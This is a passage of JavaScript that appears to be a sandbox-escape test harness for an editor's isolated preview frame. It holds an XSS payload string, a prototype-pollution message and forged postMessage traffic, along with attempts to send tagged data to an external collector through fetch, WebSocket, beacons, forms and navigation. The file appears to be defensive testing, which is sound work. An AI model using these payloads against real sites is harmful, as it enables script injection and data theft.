  t("Range.surroundContents", () => { const a = document.createElement("span"); host.appendChild(a); const r = document.createRange(); r.selectNode(a); r.surroundContents(make()); });
  t("fragment append", () => { const fr = document.createDocumentFragment(); Node.prototype.appendChild.call(fr, make()); host.append(fr); });
  t("document.documentElement.appendChild", () => document.documentElement.appendChild(make()));
  t("document.body.append", () => document.body.append(make()));
  t("shadow root appendChild", () => { const d = document.createElement("div"); host.appendChild(d); d.attachShadow({ mode: "open" }).appendChild(make()); });
  t("moveBefore", () => { if (typeof host.moveBefore !== "function") throw new TypeError("No such method"); host.moveBefore(make(), null); });
  t("Reflect.apply(method on the prototype)", () => Reflect.apply(Node.prototype.appendChild, host, [make()]));
  t("appendChild after Function.prototype.call is overwritten", () => { const keep = Function.prototype.call; Function.prototype.call = function () { return undefined; }; try { host.appendChild(make()); } finally { Function.prototype.call = keep; } });
  await wait(300);
  out["Child frame count at the end"] = String(window.length);
  host.remove();
  return out;
}

/* ------------------------------------------------------------------ Forgery: send various messages to parent page */
export function forgedMessages(ctx) {
  // Construct out-of-range number dynamically: this source code (along with transpilation output)
  // enters the editor page transpilation cache; if the literal were written here, the probe would
  // find the source code itself when searching for this number in parent page storage
  const HUGE = Number("7.77e" + "98");
  const M = ctx.magic, big = "x".repeat(1024 * 1024);
  const xss = "<img src=x onerror=\"parent.__pcXss=1;window.__pcXss=1\"><script>window.__pcXss=1</" + "script><div data-pcboundary-html=\"" + ctx.tag + "\">" + M + "</div>";
  const list = [
    { type: "pc-stage-ready", hostCapabilities: { prerender: "yes", offscreenGl: 1, compact: { a: 1 }, lowest: "x", measure: [], catchUp: null, stageId: "Z", ticket: M } },
    { type: "pc-stage-ready", hostCapabilities: big },
    { type: "pc-stage-isolation", report: { ok: true, crossOrigin: true, csp: "header", egress: "allowlist", hardened: true, trustedTypes: "enforced", reasons: [], extra: M } },
    { type: "pc-stage-isolation", report: { ok: true } },
    { type: "pc-stage-isolation", report: big },
    { type: "pc-stage-cards", stamp: 1e308 },
    { type: "pc-rpc-reply", id: 1, ok: true, result: { ticket: M, elapsedMs: -1e99, steps: [1e99, NaN, Infinity] } },
    { type: "pc-rpc-reply", id: -1, ok: true, result: big },
    { type: "pc-rpc-reply", id: 2, ok: false, error: big },
    { type: "frame", sec: 1e99 }, { type: "frame", sec: -5 }, { type: "frame", sec: "1" }, { type: "ended", sec: NaN },
    { type: "settled", sec: 1, clipIds: new Array(100000).fill(M) },
    { type: "probe", identityKey: "FORGED-" + M, fps: 30, stepMs: HUGE, inlineMs: -HUGE, rasterMs: HUGE, serializeMs: HUGE, catchUpMs: HUGE, kind: "stepped", seekMs: HUGE },
    { type: "probe", identityKey: "FORGED-" + M, fps: 1e9, stepMs: Infinity, inlineMs: NaN, rasterMs: "1", serializeMs: null, catchUpMs: {}, kind: "sink" },
    { type: "demote", clipId: big }, { type: "demote", clipId: { toString: 1 } },
    { type: "probe-frame", clipId: "pcboundary", localFrame: 0, html: xss },
    { type: "bake-frame", session: "pcboundary", clipId: "pcboundary", localFrame: 1e99, hash: "zz", bytes: -1, htmlRaw: new ArrayBuffer(8) },
    { type: "bake-frame", session: M, clipId: M, localFrame: 0, hash: "0".repeat(64), bytes: HUGE, htmlRaw: new TextEncoder().encode(xss).buffer },
    { type: "mediaReady", sec: { valueOf: 1 } },
    { type: "auth.ticket", kind: "asset", access: "rw" },
    { type: "pc-give-me-the-ticket", reqId: M },
    { type: "__proto__", constructor: { prototype: { polluted: M } } },
    null, 42, big, [], { type: 7 },
  ];
  let sent = 0;
  for (const m of list) { try { parent.postMessage(m, "*"); sent++; } catch (e) { /* What cannot be cloned does not count */ } }
  try { parent.postMessage(JSON.parse('{"type":"frame","sec":1,"__proto__":{"polluted":"' + M + '"}}'), "*"); sent++; } catch (e) { /* Ignore */ }
  return { sent: String(sent) };
}

/* ------------------------------------------------------------------ Media effect card half: read assets via cookie, enter GPU */
export async function mediaWork(ctx) {
  const out = {};
  const t = runner(out, ctx.only);
  const url = "/media-s/" + ctx.sid + "/media/" + ctx.mediaHash;
  const glRead = (bmp) => { const c = document.createElement("canvas"); c.width = c.height = 4; const gl = c.getContext("webgl2", { preserveDrawingBuffer: true }); if (!gl) throw new Error("No webgl2"); const tex = gl.createTexture(); gl.bindTexture(gl.TEXTURE_2D, tex); gl.texImage2D(gl.TEXTURE_2D, 0, gl.RGBA, gl.RGBA, gl.UNSIGNED_BYTE, bmp); const fb = gl.createFramebuffer(); gl.bindFramebuffer(gl.FRAMEBUFFER, fb); gl.framebufferTexture2D(gl.FRAMEBUFFER, gl.COLOR_ATTACHMENT0, gl.TEXTURE_2D, tex, 0); const px = new Uint8Array(4); gl.readPixels(0, 0, 1, 1, gl.RGBA, gl.UNSIGNED_BYTE, px); return Array.from(px).join(","); };
  await t("range", () => fetch(url, { headers: { Range: "bytes=0-7" } }).then(async (r) => r.status + " " + r.headers.get("content-range") + " " + Array.from(new Uint8Array(await r.arrayBuffer())).join(",")));
  await t("img-canvas-2d", () => new Promise((res, rej) => { const i = new Image(); i.onload = () => { const c = document.createElement("canvas"); c.width = c.height = 4; const g = c.getContext("2d"); g.drawImage(i, 0, 0); res(Array.from(g.getImageData(0, 0, 1, 1).data).join(",")); }; i.onerror = () => rej(new Error("Image unavailable")); i.src = url; }));
  await t("img-webgl2", async () => { const r = await fetch(url); const bmp = await createImageBitmap(await r.blob(), { premultiplyAlpha: "none" }); return glRead(bmp); });
  await t("other-sid", () => fetch("/media-s/" + "0".repeat(32) + "/media/" + ctx.mediaHash).then((r) => "Status:" + r.status));
  await t("legacy-route-without-ticket", () => fetch("/media/api/asset/media/" + ctx.mediaHash).then((r) => "Status:" + r.status));
  await t("post-to-media", () => fetch(url, { method: "POST", body: "x" }).then((r) => "Status:" + r.status));
  await t("other-namespace", () => fetch("/media-s/" + ctx.sid + "/snap/" + ctx.mediaHash).then((r) => "Status:" + r.status));
  await t("chunks-route", () => fetch(url + "/chunks").then((r) => "Status:" + r.status));
  return out;
}

/* ------------------------------------------------------------------ Sound half: run in Worker */
export async function workerAttempts(ctx) {
  const out = {};
  const t = runner(out, ctx.only);
  const E = ctx.collector, tag = ctx.tag;
  await t("w.globals", () => typeof self.parent + "/" + typeof self.top + "/" + typeof self.document + "/" + typeof self.localStorage + "/" + typeof self.opener);
  await t("w.RTCPeerConnection", () => typeof self.RTCPeerConnection + "/" + typeof self.webkitRTCPeerConnection);
  await t("w.indexedDB", () => indexedDB.databases().then((d) => text(d.map((x) => x.name))));
  await t("w.cookieStore", () => (typeof cookieStore === "undefined" ? "API not available" : cookieStore.getAll().then((all) => text(all.map((c) => c.name + "=" + c.value)))));
  await t("w.caches", () => caches.keys().then(text));
  await t("w.opfs", async () => { const d = await navigator.storage.getDirectory(); const n = []; for await (const k of d.keys()) n.push(k); return text(n); });
  await t("w.location", () => self.location.href);
  await t("w.fetch", () => fetch(E + "/x?wfetch=" + tag).then((r) => "reached:" + r.status));
  await t("w.fetch-no-cors", () => fetch(E + "/x?wnocors=" + tag, { mode: "no-cors" }).then(() => "reached"));
  await t("w.xhr", () => new Promise((res) => { const x = new XMLHttpRequest(); x.onload = () => res("reached"); x.onerror = () => res("blocked"); x.open("GET", E + "/x?wxhr=" + tag); x.send(); }));
  await t("w.websocket", () => new Promise((res) => { const w = new WebSocket(E.replace("http", "ws") + "/ws?wws=" + tag); w.onopen = () => res("reached"); w.onerror = () => res("blocked"); }));
  await t("w.eventsource", () => new Promise((res) => { const s = new EventSource(E + "/x?wes=" + tag); s.onopen = () => res("reached"); s.onerror = () => { s.close(); res("blocked"); }; }));
  await t("w.importScripts", () => { importScripts(E + "/x.js?wimport=" + tag); return "reached"; });
  await t("w.dynamic-import", () => new Function("u", "return imp" + "ort(u)")(E + "/x.js?wdynimport=" + tag).then(() => "reached"));
  await t("w.nested-worker-url", () => new Promise((res) => { try { const w = new Worker(E + "/x.js?wworker=" + tag); w.onerror = () => res("blocked"); later(() => res("created"), 500); } catch (e) { res("threw:" + e.name); } }));
  await t("w.webtransport", () => { if (typeof WebTransport !== "function") return "API not available"; const w = new WebTransport("https://127.0.0.1:" + ctx.collectorPort + "/wwt"); return w.ready.then(() => "reached", () => "blocked"); });
  await t("w.beacon", () => (self.navigator.sendBeacon ? String(self.navigator.sendBeacon(E + "/x?wbeacon=" + tag, "d")) : "API not available"));
  if (ctx.sid && ctx.mediaHash) await t("w.media", () => fetch(self.location.origin === "null" ? "" : (ctx.stageOrigin || self.location.origin) + "/media-s/" + ctx.sid + "/media/" + ctx.mediaHash).then((r) => "Status:" + r.status + " " + text(Array.from(r.headers.entries()))));
  await t("w.pcm", () => { const a = new Float32Array(4800); for (let i = 0; i < a.length; i++) a[i] = Math.sin(i / 20); return "Samples:" + a.length; });
  return out;
}

/* ------------------------------------------------------------------ Navigation: navigate the stage itself or top level away (will kill stage; probe opens a separate page for each) */
export function navAttack(ctx) {
  const E = ctx.collector, tag = ctx.tag, nav = ctx.nav;
  try {
    if (nav === "self") location.href = E + "/x?navself=" + tag;
    if (nav === "assign") location.assign(E + "/x?navassign=" + tag);
    if (nav === "top") top.location.href = E + "/x?navtop=" + tag;
    if (nav === "parent") parent.location.href = E + "/x?navparent=" + tag;
    if (nav === "open") window.open(E + "/x?navopen=" + tag);
    if (nav === "open-top") window.open(E + "/x?navopentop=" + tag, "_top");
    if (nav === "meta") { const m = document.createElement("meta"); m.httpEquiv = "refresh"; m.content = "0;url=" + E + "/x?navmeta=" + tag; document.head.appendChild(m); }
    if (nav === "anchor") { const a = document.createElement("a"); a.href = E + "/x?navanchor=" + tag; a.target = "_top"; document.body.appendChild(a); a.click(); }
    if (nav === "anchor-blank") { const a = document.createElement("a"); a.href = E + "/x?navblank=" + tag; a.target = "_blank"; a.rel = "opener"; document.body.appendChild(a); a.click(); }
    if (nav === "form-self") { const f = document.createElement("form"); f.action = E + "/x?form=" + tag; f.method = "POST"; f.target = "_self"; document.body.appendChild(f); f.submit(); }
    if (nav === "form-blank") { const f = document.createElement("form"); f.action = E + "/x?formblank=" + tag; f.method = "GET"; f.target = "_blank"; document.body.appendChild(f); f.submit(); }
    if (nav === "a-download") { const a = document.createElement("a"); a.href = E + "/x?download=" + tag; a.download = "x"; document.body.appendChild(a); a.click(); }
    if (nav === "form-top") { const f = document.createElement("form"); f.action = E + "/x?navform=" + tag; f.target = "_top"; document.body.appendChild(f); f.submit(); }
    return "initiated";
  } catch (e) {
    return "threw:" + (e && e.name);
  }
}

/** A single card runs the above groups in sequence (both user card and media effect card entry points call it; media effect card has an extra group reading assets into the GPU) */
export async function runAll(ctx) {
  const result = { tag: ctx.tag, at: Date.now() };
  result.parent = await parentReads(ctx);
  // While listening for messages from the parent page: dump everything readable, (media effect
  // cards) read assets into GPU via cookies, try creating a subframe (hardening intercepts and reports
  // it, parent page re-evaluates and resends tier selection policy to both instances: heard messages
  // should not contain tickets)
  const heard = [];
  const onMessage = (e) => { try { heard.push(text(e.data).slice(0, 200000)); } catch (err) { heard.push("message unreadable"); } };
  addEventListener("message", onMessage);
  result.dump = await dumpEverything(ctx);
  if (ctx.graph && ctx.sid && ctx.mediaHash) result.media = await mediaWork(ctx);
  result.firstBreach = await hardenAttacks({ ...ctx, only: ["createElement"] });
  await wait(ctx.listenAfterMs || 4000);
  removeEventListener("message", onMessage);
  result.heard = { "parent-messages": heard.join("\n") };
  // By this point the gate has already closed due to the attempt above; run anyway to see whether
  // the browser and hardening can block it
  result.forged = forgedMessages(ctx);
  result.exfil = await exfilAttacks({ ...ctx, only: ["fetch", "img", "css-bg", "script"] });
  result.harden = await hardenAttacks(ctx);
  return result;
}
